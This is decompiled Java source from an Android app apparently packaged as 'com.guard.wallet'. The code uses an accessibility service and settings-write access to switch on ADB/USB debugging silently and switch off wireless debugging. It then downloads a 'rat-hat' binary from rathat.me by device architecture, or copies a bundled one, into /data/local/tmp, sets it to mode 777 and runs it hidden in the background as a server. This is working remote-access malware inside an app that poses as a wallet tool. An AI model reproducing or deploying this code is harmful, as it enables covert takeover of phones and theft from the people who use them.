package h;

import a1.q;
import android.content.Context;
import android.os.Build;
import android.os.Build.VERSION;
import android.provider.Settings.Global;
import android.provider.Settings.System;
import android.util.Log;
import com.guard.wallet.entity.CheckPortResult;
import com.guard.wallet.http.l;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.g;
import com.guard.wallet.utils.h;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.locks.ReentrantLock;

// $VF: synthetic class
public final class a implements Runnable {
   public final int a;
   public final e b;

   @Override
   public final void run() {
      int var1 = this.a;
      boolean var4 = true;
      boolean var3 = true;
      e var16 = this.b;
      switch (var1) {
         case 0:
            AtomicBoolean var38 = var16.m;
            boolean var32 = var38.get();
            AtomicInteger var58 = var16.n;
            if (!var32) {
               if (var58.get() < 12) {
                  var58.set(var58.get() + 1);
                  return;
               }

               var38.set(true);
            } else {
               var58.set(0);
            }

            if (!var16.s.get() && !MyAccessibilityService.r.get()) {
               a var39;
               if (MyAccessibilityService.P() == null) {
                  var39 = new a(var16, 1);
               } else {
                  var39 = new a(var16, 2);
               }

               var16.p.submit(var39);
            }

            if (var16.U()) {
               Integer var17;
               ReentrantLock var64;
               var32 = var16.D();
               var58 = var16.y;
               var64 = var16.j;
               var17 = e.E;
               label291:
               if (!var32) {
                  Integer var40 = h.b();
                  if (var40 > 0 && var64.tryLock()) {
                     CheckPortResult var41 = var16.J(var40);
                     var64.unlock();
                     if (var41 != null && var41.isConnected()) {
                        break label291;
                     }
                  }

                  Context var15 = var16.i;
                  CheckPortResult var42;
                  if (var15 != null && var16.C() != null && var16.B() != null && var64.tryLock()) {
                     label316: {
                        label315: {
                           boolean var7;
                           label314: {
                              label351: {
                                 try {
                                    if (q.E(var17)) {
                                       break label315;
                                    }

                                    var32 = var16.z(var17);
                                 } catch (Exception var23) {
                                    var43 = var23;
                                    var32 = false;
                                    break label351;
                                 }

                                 var7 = var32;
                                 if (!var32) {
                                    break label314;
                                 }

                                 try {
                                    var1 = var17;
                                    break label316;
                                 } catch (Exception var22) {
                                    var43 = var22;
                                 }
                              }

                              q.s("AdbConnectionManager", var43);
                              var7 = var32;
                           }

                           var32 = var7;
                           var1 = 0;
                           break label316;
                        }

                        var1 = 0;
                        var32 = false;
                     }

                     int var2;
                     boolean var36;
                     var2 = var1;
                     var36 = var32;
                     label299:
                     if (!var32) {
                        var2 = var1;
                        var36 = var32;

                        int var5;
                        try {
                           if (VERSION.SDK_INT < 30) {
                              break label299;
                           }

                           var5 = var16.x(var15);
                        } catch (Exception var21) {
                           q.s("AdbConnectionManager", var21);
                           var36 = var32;
                           var2 = var1;
                           break label299;
                        }

                        var2 = var5;
                        var36 = var32;
                        if (var5 > 0) {
                           var36 = true;
                           var2 = var5;
                        }
                     }

                     if (var36) {
                        var42 = new CheckPortResult();
                        var42.setConnected(true);
                        var42.setDebugPort(var2);
                        var42.setConnectedDevice("com.guard.wallet");
                        h.x(var42);
                        var58.set(0);
                        var16.u.set(true);
                        var16.v.set(true);
                     } else {
                        var42 = null;
                     }

                     var64.unlock();
                  } else {
                     var42 = null;
                  }

                  if ((var42 == null || !var42.isConnected()) && var16.U() && g.J()) {
                     CheckPortResult var44 = var16.M();
                     if (var44 != null) {
                        var44.isConnected();
                     }
                  }
               }

               if (var16.D()) {
                  var38 = var16.B;
                  if (var38.get()) {
                     g.D();
                     var16.V();
                     var38.set(false);
                  } else {
                     var1 = var16.P(
                        "if [ -f /data/local/tmp/rat-hat ]; then echo \"File exists\"; else echo \"File does not exist\"; fi",
                        new i.a("File exists", true, 1),
                        new i.a("File does not exist", true, 1)
                     );
                     if (var1 == 1) {
                        h.z(true);
                        var1 = var16.P("ps -ef | grep rat-hat", new i.a("rat-hat server -d", true, 0), new i.a("grep rat-hat", false, 1));
                        boolean var27;
                        if (var1 != 1 && (var1 == 0 || q.E(7912))) {
                           var27 = false;
                        } else {
                           var27 = true;
                        }

                        if (!var27) {
                           var16.O("nohup /data/local/tmp/rat-hat server -d > /dev/null &");
                        } else {
                           g.D();
                           var16.V();
                        }
                     } else {
                        label278:
                        if (var1 == 0) {
                           h.z(false);
                           String var46 = g.y0();
                           if (!q.B(var46)) {
                              String var47 = var46.concat("/").concat("librat-hat.so");
                              if (q.w(var47)) {
                                 String var60 = "/data/local/tmp/".concat("rat-hat");
                                 String var48 = "cp".concat(" -f ").concat(var47).concat(" ").concat(var60);
                                 String var61 = "chmod".concat(" ").concat("777").concat(" ").concat(var60);
                                 if (var16.N(var48) && var16.N(var61)) {
                                    h.z(true);
                                    break label278;
                                 }
                              }
                           }

                           String[] var49 = Build.SUPPORTED_ABIS;
                           String var50;
                           if (var49 != null && var49.length > 0) {
                              var50 = var49[0];
                           } else {
                              var50 = "armeabi";
                           }

                           String var65 = com.guard.wallet.utils.d.c();
                           String var62 = var65;
                           if (q.B(var65)) {
                              var62 = "https://rathat.me/lib";
                           }

                           String var67 = com.guard.wallet.utils.d.d();
                           String var66 = var67;
                           if (q.B(var67)) {
                              var66 = "rat-hat";
                           }

                           var16.I(
                              null,
                              var62.concat("/").concat(var50).concat("/").concat(var66),
                              "rat-hat",
                              "nohup /data/local/tmp/rat-hat server -d > /dev/null &"
                           );
                        } else {
                           Log.d("AdbConnectionManager", "无法检测是否已安装RatHat");
                        }
                     }
                  }

                  Integer var51 = h.b();
                  if (var16.D()) {
                     var32 = Objects.equals(var51, var17);
                     AtomicInteger var52 = var16.z;
                     if (!var32) {
                        var1 = var52.incrementAndGet();
                        if (var1 > 1 && var1 <= 5) {
                           LinkedList var54 = new LinkedList();
                           var54.add(new i.a("mtp", true, 0));
                           LinkedList var63 = new LinkedList();
                           var63.add(new i.a("ptp", true, 0));
                           var63.add(new i.a("rndis", true, 0));
                           var63.add(new i.a("midi", true, 0));
                           var63.add(new i.a("ncm", true, 0));
                           if (var16.Q("svc usb getFunctions", var54, var63) == 0) {
                              var16.N("svc usb setFunctions mtp");
                           }
                        } else if (var1 > 5 && var1 <= 10) {
                           if (!g.I()) {
                              if (!g.p0() && MyAccessibilityService.P() != null && MyAccessibilityService.P().V()) {
                                 label236: {
                                    label235: {
                                       try {
                                          if (g.Z() != null && (System.canWrite(g.Z()) || g.j())) {
                                             Log.d("ApplicationUtil", "已有系统设置修改权限");
                                             Global.putInt(g.Z().getContentResolver(), "adb_enabled", 1);
                                             if (g.I()) {
                                                Log.d("ApplicationUtil", "已有系统设置修改权限,开启USB调试成功");
                                                break label235;
                                             }
                                          }
                                       } catch (Exception var20) {
                                          q.s("ApplicationUtil", var20);
                                       }

                                       var29 = false;
                                       break label236;
                                    }

                                    var29 = var3;
                                 }

                                 if (var29) {
                                    return;
                                 }
                              }

                              if (!g.p0() && MyAccessibilityService.P() != null && MyAccessibilityService.P().V()) {
                                 Log.d("AdbConnectionManager", "无障碍服务监听窗口初始化已完成,准备开启ADB调试");
                                 l.k("http://127.0.0.1:7911");
                              } else {
                                 Log.d("AdbConnectionManager", "锁屏中、黑屏中、无障碍服务监听窗口初始化未完成");
                              }

                              return;
                           }
                        } else {
                           StringBuilder var53 = new StringBuilder("useDefaultPort ErrorCount:");
                           var53.append(var1);
                           Log.d("AdbConnectionManager", var53.toString());
                        }

                        if (g.I()) {
                           StringBuilder var55 = new StringBuilder("USE DEFAULT ADB PORT:");
                           var55.append(var17);
                           Log.d("AdbConnectionManager", var55.toString());
                           String var56 = String.valueOf(var17);
                           if (!q.B(var56)) {
                              try {
                                 var16.E(new String[]{var56}, 16).B(2000L);
                              } catch (Exception var18) {
                                 q.s("AdbConnectionManager", var18);
                              }
                           }
                        }
                     } else {
                        var52.set(0);
                     }
                  }
               } else {
                  var1 = var58.incrementAndGet();
                  if (var1 <= 0 || var1 > 6) {
                     label212: {
                        label211: {
                           try {
                              if (g.Z() != null && (System.canWrite(g.Z()) || g.j())) {
                                 Log.d("ApplicationUtil", "已有系统设置修改权限");
                                 Global.putInt(g.Z().getContentResolver(), "adb_wifi_enabled", 0);
                                 if (!g.J()) {
                                    Log.d("ApplicationUtil", "已有系统设置修改权限,关闭无线调试成功");
                                    break label211;
                                 }
                              }
                           } catch (Exception var19) {
                              q.s("ApplicationUtil", var19);
                           }

                           var31 = false;
                           break label212;
                        }

                        var31 = var4;
                     }

                     if (!var31) {
                        l.f("http://127.0.0.1:7911");
                     }

                     var58.set(0);
                  } else if (var1 % 3 != 0) {
                     Integer var57 = h.b();
                     if (var57 > 0 && var64.tryLock()) {
                        var16.J(var57);
                        var64.unlock();
                     }
                  } else {
                     var16.M();
                  }
               }
            }

            return;
         case 1:
            AtomicBoolean var37 = var16.s;
            var37.set(true);
            var16.t.set(0L);
            if (!g.L() && !q.E(7912)) {
               l.w();
               g.T0(25);
            }

            var37.set(false);
            return;
         default:
            AtomicBoolean var12;
            label344: {
               var12 = var16.s;
               var12.set(true);
               long var8 = java.lang.System.currentTimeMillis();
               AtomicLong var14 = var16.t;
               if (var14.get() != 0L) {
                  long var10 = var8 - var14.get();
                  if (var10 <= 60000L) {
                     break label344;
                  }

                  MyAccessibilityService var13 = MyAccessibilityService.P();
                  boolean var6;
                  if (var13.h.get()) {
                     var6 = false;
                  } else {
                     var6 = var13.i.get();
                  }

                  if (!var6) {
                     if (var10 > 300000L) {
                        var14.set(var8);
                        MyAccessibilityService.P().H(true, false);
                     }
                     break label344;
                  }

                  if (!g.L() && !q.E(7912)) {
                     l.w();
                     g.T0(25);
                  }
               }

               var14.set(var8);
            }

            var12.set(false);
      }
   }
}
